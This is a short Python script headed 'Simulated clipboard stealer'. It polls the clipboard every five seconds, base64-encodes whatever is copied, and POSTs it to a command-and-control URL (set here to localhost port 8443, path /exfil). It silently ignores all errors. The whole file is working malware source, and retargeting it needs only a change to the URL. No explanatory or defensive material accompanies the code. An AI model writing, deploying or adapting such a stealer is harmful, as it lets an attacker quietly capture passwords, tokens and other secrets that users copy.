# Simulated clipboard stealer
import pyperclip, requests, time, base64

C2 = "http://127.0.0.1:8443/exfil"
while True:
    try:
        data = pyperclip.paste()
        if data:
            blob = base64.b64encode(data.encode()).decode()
            requests.post(C2, data={"clip": blob})
    except Exception:
        pass
    time.sleep(5)
